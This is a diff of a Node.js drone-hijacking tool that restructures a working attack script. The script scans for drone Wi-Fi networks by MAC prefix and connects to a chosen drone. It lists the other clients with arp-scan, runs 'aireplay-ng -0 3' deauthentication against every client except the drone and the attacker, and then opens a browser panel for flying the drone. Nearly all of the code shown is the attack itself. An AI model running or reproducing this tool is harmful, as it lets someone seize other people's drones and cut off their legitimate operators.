@@ -18,24 +18,161 @@ app.use(express.static('public'));
 if (!commandExistsSync('arp-scan')) { console.log("Error : missing command 'arp-scan' please install it and retry"); process.exit(); }
 if (!commandExistsSync('aireplay-ng')) { console.log("Error : missing command 'aireplay-ng' please install 'aircrack-ng' and retry"); process.exit(); }
 
-// Init values, wifi and launch attack
+// Init values, wifi, launch deauth attack, then init navigation app (step by step using promise)
 var iface = 'wlan0';
 var target = null;
 var attackMAC = null;
 var scan_wifi = scanWifi();
-var hack = scan_wifi.then(initHack);
-var connect_wifi = hack.then(connectWifi);
+var deauth = scan_wifi.then(launchDeauth, console.error);
+var connect_wifi = deauth.then(connectWifi, console.error);
 
-Promise.all([scan_wifi, hack, connect_wifi]).then(values => {
-  values.forEach((e) => console.log(e));
-
+Promise.all([scan_wifi, deauth, connect_wifi]).then(values => {
   http.listen(3000, function() {
     console.log('Navigation control running at http://localhost:3000/');
   });
 
   initNavControl();
-}, console.error);
+});
 
+/**
+* Scan for drone wifi networks using MAC address prefixes and
+* prompt to choose the one to target, then connects to it.
+*/
+function scanWifi() {
+  return new Promise(function(resolve, reject) {
+    // Check wifi interface
+    var interfaces = os.networkInterfaces();
+    if (interfaces[iface] === undefined) return reject("Error : " + iface + " interface not available");
+
+    attackMAC = interfaces[iface][0].mac;
+    console.log('Attack from interface ' + iface, attackMAC);
+
+    var droneMacs = ['90:03:B7', 'A0:14:3D', '00:12:1C', '00:26:7E'];
+
+    wifi.init({
+      iface: iface
+    });
+
+    console.log("Scan available drone wifi...");
+    // Scan networks
+    wifi.scan(function(err, networks) {
+
+      // Filter drone networks
+      networks = networks.filter(function(e) {
+        return droneMacs.indexOf(e.mac.substring(0, 8)) !== -1
+      });
+
+      if (networks.length < 1) return reject("Error : No drone networks available");
+
+      console.log("Available drone wifi :");
+      networks.forEach(function(e, i) {
+        console.log("  " + i + ".  " + e.ssid);
+      });
+
+      var schema = {
+        properties: {
+          choice: {
+            description: 'Choose target drone ssid ? (0)',
+            default: 0,
+            type: 'integer',
+            message: 'Choice must be index of wifi',
+            required: true
+          }
+        }
+      };
+
+      prompt.start();
+      prompt.get(schema, function(err, result) {
+        var choice = parseInt(result.choice);
+        target = networks[choice];
+        console.log('Connection to ' + target.mac + ' ...');
+        wifi.connect({
+          ssid: target.ssid
+        }, function(err) {
+          if (err) return reject(err);
+          console.log('Connected');
+          resolve();
+        });
+      });
+    });
+  })
+}
+
+/**
+* Scan the drone network using 'arp-scan' and deauth clients that are not
+* the drone or ourself
+*/
+function launchDeauth() {
+  return new Promise(function(resolve, reject) {
+
+    if (!target.mac) return reject("Error : Drone MAC address is missing");
+
+    console.log('Scan network clients...');
+    arpscan(onResult, {
+      interface: iface
+    });
+
+    function onResult(err, clients) {
+      if (err) return reject(err);
+
+      var deauthTargets = clients.filter(function(client) {
+        return client.mac != target.mac && client.mac != attackMAC
+      });
+
+      if (deauthTargets.length == 0){
+        console.log("No Clients to deauth");
+        resolve();
+      } else{
+        //Confirm prompt before deauth
+        var schema = {
+          properties: {
+            choice: {
+              description: 'Disconnect ' + deauthTargets.length + ' clients ? (true,false)',
+              default: false,
+              type: 'boolean',
+              message: 'Choice must be true or false',
+              required: true
+            }
+          }
+        };
+        prompt.start();
+        prompt.get(schema, function(err, result) {
+          if (result.choice === true) {
+            deauthTargets.forEach((client, i) => {
+              console.log('Disconnecting : ' + client.mac);
+              var exec = cp.exec;
+              exec('aireplay-ng -0 3 -a ' + target.mac + ' -c ' + client.mac + ' ' + iface, function callback(err, stdout, stderr) {
+                if (err) return reject(stderr);
+                resolve(stdout);
+              });
+            });
+          }
+        });
+      }
+    }
+  })
+}
+
+/**
+* Connect to target drone wifi
+*/
+function connectWifi() {
+  return new Promise(function(resolve, reject) {
+
+    console.log('Connection to ' + target.mac + ' ...');
+    wifi.connect({
+      ssid: target.ssid
+    }, function(err) {
+      if (err) return reject(err);
+      console.log('Connected');
+      resolve();
+    });
+  })
+}
+
+/**
+* Init navigation app in browser
+*/
 function initNavControl() {
   var currentImg = null;
   var imageSendingPaused = false;
@@ -91,131 +228,4 @@ function initNavControl() {
       console.log('user disconnected');
     });
   });
-}
-
-
-function scanWifi() {
-  return new Promise(function(resolve, reject) {
-    // Check wifi interface
-    var interfaces = os.networkInterfaces();
-    if (interfaces[iface] === undefined) return reject("Error : " + iface + " interface not available");
-
-    attackMAC = interfaces[iface][0].mac;
-    console.log('Attack from interface ' + iface, attackMAC);
-
-    var droneMacs = ['90:03:B7', 'A0:14:3D', '00:12:1C', '00:26:7E'];
-
-    wifi.init({
-      iface: iface
-    });
-
-    console.log("Scan available drone Wifi...");
-    // Scan networks
-    wifi.scan(function(err, networks) {
-
-      // Filter drone networks
-      networks = networks.filter(function(e) {
-        return droneMacs.indexOf(e.mac.substring(0, 8)) !== -1
-      });
-
-      if (networks.length < 1) return reject("Error : No drone networks available");
-
-      console.log("Available drone Wifi :");
-      networks.forEach(function(e, i) {
-        console.log("  " + i + ".  " + e.ssid);
-      });
-
-      var schema = {
-        properties: {
-          choice: {
-            description: 'Choose wifi to connect ? (0)',
-            default: 0,
-            type: 'integer',
-            message: 'Choice must be index of wifi',
-            required: true
-          }
-        }
-      };
-
-      prompt.start();
-      prompt.get(schema, function(err, result) {
-        var choice = parseInt(result.choice);
-        target = networks[choice];
-        console.log('Connection to ' + target.mac + ' ...');
-        wifi.connect({
-          ssid: target.ssid
-        }, function(err) {
-          if (err) return reject(err);
-          console.log('Connected');
-          resolve();
-        });
-      });
-    });
-  })
-}
-
-
-function connectWifi() {
-  return new Promise(function(resolve, reject) {
-
-    console.log('Connection to ' + target.mac + ' ...');
-    wifi.connect({
-      ssid: target.ssid
-    }, function(err) {
-      if (err) return reject(err);
-      console.log('Connected');
-      resolve();
-    });
-  })
-}
-
-function initHack() {
-  return new Promise(function(resolve, reject) {
-
-    if (!target.mac) return reject("Error : Drone MAC address is missing");
-
-    console.log('Scan network clients...');
-    arpscan(onResult, {
-      interface: iface
-    });
-
-    function onResult(err, clients) {
-      if (err) return reject(err);
-
-      var deauthTargets = clients.filter(function(client) {
-        return client.mac != target.mac && client.mac != attackMAC
-      });
-
-      if (deauthTargets.length == 0){
-        console.log("No Clients to deauth");
-        resolve();
-      } else{
-        var schema = {
-          properties: {
-            choice: {
-              description: 'Disconnect ' + deauthTargets.length + ' clients ? (true,false)',
-              default: false,
-              type: 'boolean',
-              message: 'Choice must be true or false',
-              required: true
-            }
-          }
-        };
-
-        prompt.start();
-        prompt.get(schema, function(err, result) {
-          if (result.choice === true) {
-            deauthTargets.forEach((client, i) => {
-              console.log('Disconnecting : ' + client.mac);
-              var exec = cp.exec;
-              exec('aireplay-ng -0 3 -a ' + target.mac + ' -c ' + client.mac + ' ' + iface, function callback(err, stdout, stderr) {
-                if (err) return reject(stderr);
-                resolve(stdout);
-              });
-            });
-          }
-        });
-      }
-    }
-  })
 }
